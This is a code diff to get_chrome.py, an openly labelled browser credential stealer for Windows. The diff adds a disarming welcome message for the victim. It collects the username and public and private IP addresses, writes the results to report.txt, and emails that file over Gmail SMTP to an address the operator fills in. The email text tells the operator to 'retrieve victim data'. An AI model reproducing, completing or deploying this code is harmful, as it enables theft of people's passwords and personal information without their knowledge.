@@ -1,6 +1,5 @@
 ## madeby parad0x 20/10/19 8:48pm ##
-## UPDATED by parad0x 23/10/19 11:55pm ##
-## WINDOWS ONLY ## // supports all functions //
+## WINDOWS ONLY ## // supports all
 
 #imports
 import os
@@ -47,27 +46,26 @@ def kill_browsers():
 	#os.system("cls")
 
 # gather user info
+program_name = 'get_chrome.py'
 datetime = time.ctime(time.time())
 user = os.path.expanduser('~').split('\\')[2]
 publicIP = requests.get('https://api.ipify.org/').text
 privateIP = socket.gethostbyname(socket.gethostname())
-
-# get passwords
+OS = platform.system()
 
 old_app = ''
 
-# writes an OS string, for the if statement to read //
-# prints the OS system ie; Mac, Windows, Linux etc...
-OS = platform.system()
+welcome = 'Welcome ' + user + ' to ' + program_name + '!'
+
 # sees if the OS is windows, if so - continue. If not - exits.
 if (OS == "Windows"):
-	print("Your OS is compatable! :)")
+	print(welcome)
 	pass # Continues script
 else: # Exits the script with a message
-	print("Your OS is incompatible :(\nThis program only supports Windows systems\nparad0x's team will support your OS in future updates!") # Prints the compatable OS for this program.
+	print(OS + " is incompatible :(\nThis program only supports Windows systems\nparad0x's team will support your OS in future updates!") # Prints the compatable OS for this program.
 	time.sleep(10)
 	exit()
-
+time.sleep(5)
 
 
 def get_bytes():
@@ -102,36 +100,33 @@ def get_bytes():
 
 # sends .txt as an attachment, to your email
 def send_stuff():
-	# our email contents
-	mail_content = 'INSTRUCTIONS:\n• Attachment name is noname, please rename it with .txt at the end of it.\n• This was sent by parad0x and Snavellet.\n'
+	email_from = 'YOUREMAIL@gmail.com'
+	password = 'YOURPASSWORD'
+	email_to = 'RECEIVERADDRESS@gmail.com'
+	subject = 'get_chrome RESULTS'
+	msg = MIMEMultipart()
+	msg['From'] = email_from
+	msg['To'] = email_to
+	msg['Subject'] = subject
 
-	#email // CHANGE ALL CONTENT IN '' TO YOUR DETAILS
-	sender_address = 'exampleemail@example.com'
-	sender_pass = 'examplepassword'
-	receiver_address = 'examplereceiveraddress'
+	body = "Hi there!\nI see you've made it this far with get_chrome.\nPlease follow the instructions below.\n• Our latest update has allowed us to send the proper text format file.\n• Open the .txt file to retrieve victim data.\nThanks for using get_chrome\n[!] Please star our project: https://github.com/parad0xxxx/get_chrome\n[!] Follow me on GitHub: https://github.com/parad0xxxx\nCreator: ~ parad0x & snavellet"
+	msg.attach(MIMEText(body,'plain'))
 
-	#setup mime
-	message = MIMEMultipart()
-	message['From'] = sender_address
-	message['To'] = receiver_address
-	message['Subject'] = 'chromehacking'
-	message.attach(MIMEText(mail_content, 'plain'))
-	attach_file_name = 'report.txt'
-	attach_file = open('report.txt', 'r') # opens the file in read mode
-	payload = MIMEBase('application', 'octate-stream')
-	payload.set_payload((attach_file).read())
-	encoders.encode_base64(payload) # encodes the attachment
-	# add payload header
-	payload.add_header('Content-Discomposition', 'attachment: filename= '+attach_file_name)
-	message.attach(payload)
+	filename='report.txt'
+	attachment =open(filename,'rb')
 
-	#smtp session (sending it)
-	session = smtplib.SMTP('smtp.gmail.com', 587)
-	session.starttls()
-	session.login(sender_address, sender_pass)
-	text = message.as_string()
-	session.sendmail(sender_address, receiver_address, text)
-	session.quit()
+	part = MIMEBase('application', 'octet-stream')
+	part.set_payload((attachment).read())
+	encoders.encode_base64(part)
+	part.add_header('Content-Disposition',"attachment; filename= " + filename)
+
+	msg.attach(part)
+	text = msg.as_string()
+	server = smtplib.SMTP('smtp.gmail.com',587)
+	server.starttls()
+	server.login(email_from,password)
+
+	server.sendmail(email_from,email_to,text)
 
 # runs every event
 if __name__ == '__main__':
